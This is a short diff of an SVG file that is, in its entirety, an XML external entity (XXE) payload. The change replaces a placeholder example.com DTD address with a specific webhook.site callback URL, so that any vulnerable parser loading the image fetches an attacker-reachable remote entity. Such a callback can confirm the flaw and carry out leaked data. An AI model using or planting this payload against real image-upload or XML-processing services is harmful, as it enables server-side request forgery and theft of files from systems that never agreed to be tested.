@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [
-  <!ENTITY % xxe SYSTEM "http://example.com/xxe.dtd">
+  <!ENTITY % xxe SYSTEM "https://webhook.site/1ca05e49-3e03-4822-a915-351f8e8b3956">
   %xxe;
 ]>
 <svg xmlns="http://www.w3.org/2000/svg">
